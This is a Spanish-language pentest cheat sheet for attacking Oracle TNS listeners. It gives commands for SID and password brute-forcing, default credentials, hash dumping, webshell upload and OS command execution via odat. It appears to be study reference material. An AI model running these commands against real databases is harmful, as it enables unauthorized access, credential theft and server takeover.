---
tipo: meta
aliases:
  - Oracle - matriz
  - Oracle TNS - matriz
  - oracle cheatsheet
  - odat
tags:
  - meta/referencia
  - dominio/red
---

# Oracle TNS - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 1521/tcp** (TNS listener). Para conectar hace falta el **SID** (o service name) de la instancia — encontrarlo es el primer paso. La herramienta de cabecera es **`odat`** (Oracle Database Attacking Tool). Inyección SQL web: [[MOC - SQL injection]]. Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `SID`, `u`, `p` son marcadores.

## Interrogar el listener

| Comando | Qué da |
|---|---|
| `nmap -sV --script "oracle-tns-version" -p1521 HOST` | Versión del listener |
| `tnscmd10g version -h HOST` | Versión por el protocolo TNS |
| `tnscmd10g status -h HOST` | Estado, servicios y a veces el SID |

Un listener sin contraseña (viejo) contesta `status` con los servicios registrados — el SID gratis.

## Encontrar el SID

Sin SID no hay conexión. Se adivina.

| Comando | Qué da |
|---|---|
| `odat sidguesser -s HOST -p 1521` | Fuerza bruta del SID |
| `nmap --script oracle-sid-brute -p1521 HOST` | Ídem por NSE |
| `hydra -L sids.txt HOST oracle-sid` | Ídem con hydra |

SIDs comunes: `XE`, `ORCL`, `ORCLCDB`, `PROD`, `DB11G`.

## Credenciales

| Comando | Qué da |
|---|---|
| `odat passwordguesser -s HOST -d SID --accounts-file accounts.txt` | Fuerza bruta de usuario/contraseña |
| `hydra -L users.txt -P pass.txt HOST oracle` | Ídem con hydra |

Credenciales por defecto clásicas: `scott/tiger`, `system/manager`, `sys/change_on_install` (as sysdba), `dbsnmp/dbsnmp`, `outln/outln`.

## Conectar

| Caso | Comando |
|---|---|
| Sesión normal | `sqlplus u/p@HOST:1521/SID` |
| Como DBA | `sqlplus u/p@HOST:1521/SID as sysdba` |

## Enumerar (dentro de sqlplus)

| Tarea | SQL |
|---|---|
| Versión | `SELECT * FROM v$version;` |
| Usuario actual y privilegios | `SELECT user FROM dual;` · `SELECT * FROM user_role_privs;` |
| Todos los usuarios | `SELECT username FROM all_users;` |
| Hashes (con DBA) | `SELECT name, password FROM sys.user$;` |
| ¿Soy DBA? | `SELECT * FROM user_role_privs WHERE granted_role='DBA';` |

## RCE y archivos con `odat`

Lo que hace a Oracle jugoso: con credenciales, `odat` automatiza la ejecución y el manejo de archivos.

| Objetivo | Comando |
|---|---|
| Correr todo contra la instancia | `odat all -s HOST -d SID -U u -P p` |
| Leer un archivo del host | `odat utlfile -s HOST -d SID -U u -P p --getFile /ruta local salida` |
| Escribir un archivo (webshell) | `odat utlfile -s HOST -d SID -U u -P p --putFile /var/www/html sh.php sh.php` |
| Ejecutar comando (external table) | `odat externaltable -s HOST -d SID -U u -P p --exec /tmp "id"` |
| Ejecutar comando (scheduler) | `odat dbmsscheduler -s HOST -d SID -U u -P p --exec "id"` |

`utlfile`, `externaltable` y `dbmsscheduler` son tres caminos distintos a RCE/archivos: si uno está capado, probar el siguiente.

## Configuración (con acceso al host)

| Archivo | Qué tiene |
|---|---|
| `$ORACLE_HOME/network/admin/listener.ora` | Config del listener: SIDs, contraseña del listener |
| `.../tnsnames.ora` | Alias de conexión → hosts y SIDs de la infra |
| `.../sqlnet.ora` | Autenticación y cifrado del cliente |
| `$ORACLE_HOME/dbs/orapw<SID>` | Password file de la instancia |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `ORA-12505` (SID desconocido) | SID equivocado | adivinar el SID (`odat sidguesser`) |
| `ORA-01017` (invalid username/password) | credencial mala | defaults, o `passwordguesser` |
| `ORA-28009` (connect as sysdba) | la cuenta exige `as sysdba` | agregar `as sysdba` |
| `odat` no está | no instalado | `pip install odat` o el binario del repo oficial |
